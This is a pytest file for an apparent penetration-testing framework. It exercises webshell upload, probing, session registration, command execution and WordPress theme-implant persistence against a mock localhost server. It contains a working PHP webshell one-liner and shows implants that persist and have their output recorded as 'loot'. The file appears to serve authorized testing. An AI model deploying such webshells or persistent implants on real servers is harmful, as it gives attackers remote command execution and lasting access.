"""Webshell sessions (P1.5): upload → probe → durable ref → shell_exec → kill."""

from __future__ import annotations

import asyncio
import json
from dataclasses import replace
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from threading import Thread
from urllib.parse import parse_qs, urlsplit
from uuid import uuid4

import pytest

from nexus_core.cli.engage import build_scope
from nexus_core.kernel.control_store import ControlStore
from nexus_core.kernel.fact_verification import derive_assertions
from nexus_core.kernel.models import Identity, RunContext, ToolResult
from nexus_core.kernel.sandbox import SandboxResult
from nexus_core.kernel.sessions import (
    SessionRegistry,
    parse_webshell_ref,
)
from nexus_core.scope import EngagementStore
from nexus_core.tools.handlers import wp as wp_module
from nexus_core.tools.handlers.msf_session_kill import msf_session_kill_handler
from nexus_core.tools.handlers.shell_exec import shell_exec_handler
from nexus_core.tools.handlers.web_upload import web_upload_handler

SECRET = "test-signing-secret-webshell"
UID_LINE = "uid=33(www-data) gid=33(www-data) groups=33(www-data)"


class _WebServer(BaseHTTPRequestHandler):
    """Minimal implant: multipart upload endpoint + two command endpoints."""

    commands: list[tuple[str, str, str]] = []
    uploads: list[bytes] = []

    def _reply(self, body: bytes, status: int = 200) -> None:
        self.send_response(status)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler contract
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length)
        path = urlsplit(self.path).path
        if path == "/upload":
            type(self).uploads.append(body)
            self._reply(b"uploaded")
            return
        if path == "/shell.php":
            form = parse_qs(body.decode("utf-8", "replace"))
            command = (form.get("cmd") or [""])[0]
            type(self).commands.append(("POST", path, command))
            self._reply((UID_LINE + "\n").encode())
            return
        if path == "/noexec.php":
            self._reply(b"<html><body>forbidden</body></html>")
            return
        self._reply(b"not found", status=404)

    def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler contract
        parsed = urlsplit(self.path)
        if parsed.path == "/theme.php":
            command = (parse_qs(parsed.query).get("nexuswpmcmd") or [""])[0]
            type(self).commands.append(("GET", parsed.path, command))
            self._reply((UID_LINE + "\n").encode())
            return
        self._reply(b"not found", status=404)

    def log_message(self, *args) -> None:  # keep pytest output clean
        return


@pytest.fixture()
def server():
    _WebServer.commands = []
    _WebServer.uploads = []
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), _WebServer)
    thread = Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{httpd.server_port}"
    finally:
        httpd.shutdown()
        httpd.server_close()
        thread.join(timeout=5)


@pytest.fixture()
def context(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_SCOPE_SIGNING_SECRET", SECRET)
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(workspace))
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "data"))
    store = ControlStore(tmp_path / "control.db")
    store.initialize()
    scope = EngagementStore(store).create(build_scope("bench", "127.0.0.1/32", SECRET))
    return RunContext(
        "system",
        Identity("operator-1", "system", roles=("operator",)),
        store=store,
        scope=scope,
        project_root=str(workspace),
        run_id=f"run_shell_{uuid4().hex[:8]}",
    )


def _upload(context, server_url: str, **overrides):
    payload = Path(context.project_root) / "shell.php"
    payload.write_text("<?php echo shell_exec($_POST['cmd']); ?>", encoding="utf-8")
    arguments = {
        "url": f"{server_url}/upload",
        "upload": {"path": "shell.php", "field": "file"},
        "shell_url": f"{server_url}/shell.php",
        "timeout_seconds": 20,
    }
    arguments.update(overrides)
    arguments = {key: value for key, value in arguments.items() if value is not None}
    return asyncio.run(web_upload_handler(arguments, context))


def test_upload_probes_the_webshell_and_returns_a_session_ref(context, server):
    result = _upload(context, server)
    assert result.verified, result.output
    session_ref = result.output["session_ref"]
    assert session_ref
    row = SessionRegistry(context.store).get("system", session_ref)
    assert (row["session_type"], row["transport"]) == ("webshell", "webshell")
    handle = parse_webshell_ref(row["transport_ref"])
    assert handle == {"url": f"{server}/shell.php", "method": "POST", "parameter": "cmd"}
    assert result.evidence["shell_probe"] == "executed"
    assert ("POST", "/shell.php", "id") in _WebServer.commands


def test_upload_without_shell_url_stays_a_plain_upload(context, server):
    result = _upload(context, server, shell_url=None)
    assert result.verified
    assert "session_ref" not in result.output
    assert SessionRegistry(context.store).list_sessions(
        context.tenant_id, context.scope.engagement_id
    ) == []


def test_upload_probe_without_command_output_creates_no_session(context, server):
    result = _upload(context, server, shell_url=f"{server}/noexec.php")
    assert result.verified  # the upload succeeded
    assert "session_ref" not in result.output
    assert result.evidence["shell_probe"] == "no_command_output"
    assert SessionRegistry(context.store).list_sessions(
        context.tenant_id, context.scope.engagement_id
    ) == []


def test_session_kill_closes_a_webshell_row(context, server):
    session_ref = _upload(context, server).output["session_ref"]
    result = asyncio.run(msf_session_kill_handler({"session_uuid": session_ref}, context))
    assert result.verified, result.output
    assert result.verification_method == "session_kill_registry"
    assert SessionRegistry(context.store).get("system", session_ref)["closed_at"]


def test_shell_exec_webshell_posts_the_command_to_the_registered_url(context, server):
    session_ref = _upload(context, server).output["session_ref"]
    _WebServer.commands.clear()
    result = asyncio.run(shell_exec_handler({
        "transport": "webshell", "session_id": session_ref,
        "command": "id", "timeout_seconds": 10,
    }, context))
    assert result.verified, result.output
    assert result.verification_method == "session_webshell_command"
    assert UID_LINE in result.output["output"]
    assert result.output["session_ref"] == session_ref
    assert result.output["target"] == "127.0.0.1"
    assert ("POST", "/shell.php", "id") in _WebServer.commands


def test_shell_exec_webshell_refuses_a_different_url(context, server):
    session_ref = _upload(context, server).output["session_ref"]
    result = asyncio.run(shell_exec_handler({
        "transport": "webshell", "session_id": session_ref,
        "command": "id", "url": f"{server}/other.php", "timeout_seconds": 10,
    }, context))
    assert result.verification_method == "webshell_session_target_mismatch"
    assert result.verified is False


def test_shell_exec_webshell_assertions_promote_access_privilege_and_loot(context):
    derive_context = replace(context, invocation_id="inv-webshell-1")
    result = ToolResult(
        output={
            "session_ref": "ref-webshell-1",
            "transport": "webshell",
            "target": "127.0.0.1",
            "output": "uid=0(root) gid=0(root)\nflag{fake_flag}\n",
        },
        verified=True,
        verification_method="session_webshell_command",
    )
    rows = derive_assertions(
        "nexus.post.shell_exec", {"transport": "webshell"}, result, derive_context
    )
    assert {row["fact_type"] for row in rows} == {"access", "privilege", "loot"}
    assert next(row for row in rows if row["fact_type"] == "loot")["value"]["service"] == "webshell"


def _wp_payload(server: str, *, restored: bool) -> dict:
    return {
        "ok": True, "authenticated": True, "implanted": True,
        "restored": restored, "shell_url": f"{server}/theme.php",
        "outputs": [{"command": "id", "stdout": UID_LINE}],
        "error": None, "preview": UID_LINE,
    }


def test_wp_exec_registers_a_durable_webshell_when_the_implant_persists(
    context, server, monkeypatch
):
    async def fake_run(sandbox, argv, **kwargs):
        return SandboxResult(0, json.dumps(_wp_payload(server, restored=False)), "")

    monkeypatch.setattr(wp_module, "run_in_sandbox", fake_run)
    monkeypatch.setattr(wp_module, "sandbox_for_environment", lambda *a, **k: object())
    result = asyncio.run(wp_module.wp_exec_handler({
        "url": f"{server}/blog", "username": "admin", "password": "pw",
        "restore": False,
    }, context))
    assert result.verified, result.output
    session_ref = result.output["session_ref"]
    assert session_ref
    row = SessionRegistry(context.store).get("system", session_ref)
    handle = parse_webshell_ref(row["transport_ref"])
    assert handle["method"] == "GET" and handle["parameter"] == "nexuswpmcmd"

    _WebServer.commands.clear()
    executed = asyncio.run(shell_exec_handler({
        "transport": "webshell", "session_id": session_ref,
        "command": "id", "timeout_seconds": 10,
    }, context))
    assert executed.verified, executed.output
    assert ("GET", "/theme.php", "id") in _WebServer.commands


def test_wp_exec_restoring_the_file_creates_no_session(context, server, monkeypatch):
    async def fake_run(sandbox, argv, **kwargs):
        return SandboxResult(0, json.dumps(_wp_payload(server, restored=True)), "")

    monkeypatch.setattr(wp_module, "run_in_sandbox", fake_run)
    monkeypatch.setattr(wp_module, "sandbox_for_environment", lambda *a, **k: object())
    result = asyncio.run(wp_module.wp_exec_handler({
        "url": f"{server}/blog", "username": "admin", "password": "pw",
    }, context))
    assert result.verified
    assert result.output["session_ref"] is None
    assert SessionRegistry(context.store).list_sessions(
        context.tenant_id, context.scope.engagement_id
    ) == []
